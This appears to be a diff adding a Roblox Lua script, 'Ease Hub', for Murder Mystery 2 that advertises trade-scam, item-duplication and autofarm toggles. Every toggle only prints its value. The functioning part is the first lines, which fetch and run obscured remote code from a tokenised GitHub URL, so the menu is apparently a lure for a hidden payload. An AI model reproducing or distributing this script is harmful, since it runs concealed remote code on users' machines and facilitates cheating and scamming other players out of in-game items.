@@ -1,0 +1,92 @@
+
+getgenv().gui = false
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Carti2622/mm2-dupe/main/Protected_6078050535974118.txt?token=GHSAT0AAAAAACUNTLFCXFFYGKL3YJUPRUP6ZVJWVDQ"))()
+
+if game.PlaceId == 142823291 then
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local Window = OrionLib:MakeWindow({Name = "EASE HUB ⛱️SUMMER EVENT ⛱️🏄  [Ver 6.3] ", HidePremium = false, IntroText = "Ease Hub Summer Event ⛱️", SaveConfig = true, ConfigFolder = "OrionTest"})
+
+local TradeScamTab = Window:MakeTab({
+    Name = "TRADESCAM",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+TradeScamTab:AddToggle({
+    Name = "TradeScam",
+    Default = false,
+    Callback = function(Value)
+        print(Value)
+    end    
+})
+
+TradeScamTab:AddToggle({
+    Name = "FreezeTrade",
+    Default = false,
+    Callback = function(Value)
+        print(Value)
+    end    
+})
+
+TradeScamTab:AddToggle({
+    Name = "AutoTrade",
+    Default = false,
+    Callback = function(Value)
+        print(Value)
+    end    
+})
+
+TradeScamTab:AddToggle({
+    Name = "DUPE",
+    Default = false,
+    Callback = function(Value)
+        print(Value)
+    end    
+})
+
+TradeScamTab:AddToggle({
+    Name = "HIDE ITEMS",
+    Default = false,
+    Callback = function(Value)
+        print(Value)
+    end    
+})
+
+TradeScamTab:AddToggle({
+    Name = "DUPE GODLYS ITEM",
+    Default = false,
+    Callback = function(Value)
+        print(Value)
+    end    
+})
+
+local EmotesTab = Window:MakeTab({
+    Name = "Emotes",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+EmotesTab:AddToggle({
+    Name = "Zenn",
+    Default = false,
+    Callback = function(Value)
+        print(Value)
+    end    
+})
+
+local AutoFarmTab = Window:MakeTab({
+    Name = "AutoFarm",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+AutoFarmTab:AddToggle({
+    Name = "AutoFarmGold",
+    Default = false,
+    Callback = function(Value)
+        print(Value)
+    end    
+})
+
+end
+OrionLib:Init()
